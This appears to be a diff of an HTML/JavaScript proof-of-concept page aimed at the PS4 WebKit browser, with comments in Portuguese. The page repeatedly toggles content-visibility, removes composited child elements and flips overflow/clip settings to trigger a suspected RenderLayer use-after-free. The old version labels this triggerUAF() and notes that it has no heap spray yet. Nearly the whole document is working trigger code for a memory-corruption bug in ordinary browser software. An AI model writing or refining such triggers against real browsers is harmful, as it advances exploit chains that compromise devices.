@@ -1,151 +1,128 @@
 <!doctype html>
-<html lang="pt-BR">
-<head>
-  <meta charset="utf-8">
-  <title>PS4 WebKit PoC - RenderLayer content-visibility toggle + remove</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { font-family: monospace; margin: 0; padding: 12px; }
-    .row { margin: 8px 0; }
-    button { padding: 10px 12px; margin-right: 8px; }
-    #log { white-space: pre-wrap; border: 1px solid #ccc; padding: 8px; height: 260px; overflow: auto; }
+<meta charset="utf-8">
+<title>PS4 RenderLayer candidate - ancestors + overflow truncation</title>
 
-    .container {
-      position: relative;
-      width: 95vw;
-      height: 55vh;
-      overflow: hidden;
-      border: 2px solid #444;
-      margin-top: 12px;
-      /* content-visibility será alternado via JS */
-    }
-    .child {
-      width: 140px;
-      height: 140px;
-      background: #09f;
-      position: absolute;
-      left: 20px;
-      top: 20px;
+<button id="run">RUN 50x</button>
+<button id="reset">RESET</button>
+<button id="clear">CLEAR LOG</button>
+<pre id="log" style="height:260px;overflow:auto;border:1px solid #ccc;padding:8px;"></pre>
 
-      /* força composição em muitos WebKit */
-      transform: translateZ(0);
-      will-change: transform;
-    }
-  </style>
-</head>
-<body>
-
-  <h3>PS4 WebKit - RenderLayer recompute candidate (content-visibility + DOM removal)</h3>
-
-  <div class="row">
-    <button id="one">Trigger once</button>
-    <button id="multi">Trigger 20x</button>
-    <button id="reset">Reset DOM</button>
-    <button id="clear">Clear log</button>
+<div id="root" style="
+  position:relative;
+  width:95vw;height:60vh;
+  overflow:hidden;
+  border:2px solid #444;
+">
+  <div id="scroller" style="
+    position:relative;
+    width:120%;height:120%;
+    overflow:hidden;
+    transform: translateZ(0);
+  ">
+    <div id="container" style="
+      position:relative;
+      width:100%;height:100%;
+      overflow:hidden;
+    "></div>
   </div>
-
-  <div class="row">
-    <b>UA:</b> <span id="ua"></span>
-  </div>
-
-  <div id="log"></div>
-
-  <div class="container" id="container">
-    <div class="child" id="child"></div>
-  </div>
+</div>
 
 <script>
-(function () {
-  const logEl = document.getElementById('log');
-  const uaEl = document.getElementById('ua');
-  uaEl.textContent = navigator.userAgent;
+const logEl = document.getElementById('log');
+function log(s){ logEl.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`; logEl.scrollTop = logEl.scrollHeight; }
 
-  function debug_log(msg) {
-    const ts = new Date().toLocaleTimeString();
-    logEl.textContent += `[${ts}] ${msg}\n`;
-    logEl.scrollTop = logEl.scrollHeight;
+const root = document.getElementById('root');
+const scroller = document.getElementById('scroller');
+const container = document.getElementById('container');
+
+function setCV(el, v){
+  el.style.contentVisibility = v;
+  el.style.webkitContentVisibility = v;
+}
+
+function forceReflow(){
+  void root.offsetHeight; void scroller.offsetHeight; void container.offsetHeight;
+}
+
+function makeChildren(){
+  container.textContent = "";
+  // cria múltiplos filhos para gerar z-order lists
+  for(let i=0;i<12;i++){
+    const d = document.createElement('div');
+    d.className = 'child';
+    d.style.position = 'absolute';
+    d.style.width = '120px';
+    d.style.height = '120px';
+    d.style.background = (i===0) ? '#09f' : '#ccc';
+    d.style.left = (20 + i*10) + 'px';
+    d.style.top  = (20 + i*6) + 'px';
+    d.style.zIndex = String(100 + i);
+    d.style.transform = 'translateZ(0)';
+    // joga parte para fora do container para ativar truncation
+    if(i===0){ d.style.left = '85%'; d.style.top = '70%'; }
+    if(i===1){ d.style.left = '-40px'; }
+    container.appendChild(d);
   }
+}
 
-  const container = document.getElementById("container");
+function getBlue(){
+  // primeiro filho é o azul
+  return container.firstElementChild;
+}
 
-  function getChild() {
-    return document.getElementById("child");
-  }
+function raf(){ return new Promise(r => requestAnimationFrame(() => r())); }
 
-  function setCV(value) {
-    // tenta ambas as grafias (alguns builds expõem prefixed)
-    container.style.contentVisibility = value;
-    container.style.webkitContentVisibility = value;
-  }
+async function oneIter(i){
+  makeChildren();
+  forceReflow();
 
-  function forceReflow() {
-    // força flush de layout/estilo
-    void container.offsetHeight;
-    void document.body.offsetHeight;
-  }
+  log(`iter ${i}: set content-visibility=hidden on ROOT`);
+  setCV(root, 'hidden');
+  await raf();
+  forceReflow();
 
-  function resetDOM() {
-    // recria o child se ele não existir
-    let child = getChild();
-    if (child) child.remove();
+  const blue = getBlue();
+  log(`iter ${i}: remove BLUE child`);
+  blue.remove();
+  forceReflow();
 
-    child = document.createElement('div');
-    child.className = 'child';
-    child.id = 'child';
-    container.appendChild(child);
+  // duas frames para aumentar chance de recompute em árvore de layers
+  await raf();
+  await raf();
 
-    setCV('auto');
-    forceReflow();
-    debug_log("DOM reset: child recriado e content-visibility=auto");
-  }
+  log(`iter ${i}: set content-visibility=auto on ROOT`);
+  setCV(root, 'auto');
+  forceReflow();
 
-  function triggerOnce() {
-    const child = getChild();
-    if (!child) {
-      debug_log("child já não existe; use Reset DOM antes.");
-      return;
+  // mexe em overflow (ligado ao fix citado)
+  root.style.overflow = (i % 2) ? 'hidden' : 'clip';
+  scroller.style.overflow = (i % 3) ? 'hidden' : 'clip';
+  forceReflow();
+}
+
+let running = false;
+
+document.getElementById('run').onclick = async () => {
+  if (running) return;
+  running = true;
+  log("UA: " + navigator.userAgent);
+  log("Starting 50 iterations...");
+
+  try{
+    for(let i=1;i<=50;i++){
+      await oneIter(i);
+      // pequena pausa para evitar travar o PS4
+      await new Promise(r => setTimeout(r, 20));
     }
-
-    debug_log("triggerUAF(): set content-visibility=hidden");
-    setCV("hidden");
-    forceReflow();
-
-    debug_log("triggerUAF(): removing child");
-    child.remove();
-    forceReflow();
-
-    // igual à PoC: recompute via setTimeout(0)
-    setTimeout(() => {
-      debug_log("triggerUAF(): restoring content-visibility=auto");
-      setCV("auto");
-      forceReflow();
-
-      debug_log("Done. Observe: glitch/crash/freeze? (sem heap spray)");
-    }, 0);
+  } catch(e){
+    log("JS exception: " + (e && e.message ? e.message : e));
+  } finally {
+    log("Done.");
+    running = false;
   }
+};
 
-  async function triggerMany(n) {
-    debug_log(`Starting ${n} iterations...`);
-    for (let i = 1; i <= n; i++) {
-      debug_log(`--- iter ${i}/${n} ---`);
-      resetDOM();
-      triggerOnce();
-
-      // pequena pausa para permitir recompute real
-      await new Promise(r => setTimeout(r, 50));
-    }
-    debug_log("Finished iterations.");
-  }
-
-  document.getElementById('one').onclick = () => triggerOnce();
-  document.getElementById('multi').onclick = () => triggerMany(20);
-  document.getElementById('reset').onclick = () => resetDOM();
-  document.getElementById('clear').onclick = () => { logEl.textContent = ""; };
-
-  // init
-  resetDOM();
-})();
+document.getElementById('reset').onclick = () => { makeChildren(); setCV(root,'auto'); forceReflow(); log("RESET"); };
+document.getElementById('clear').onclick = () => { logEl.textContent = ""; };
+makeChildren();
 </script>
-
-</body>
-</html>
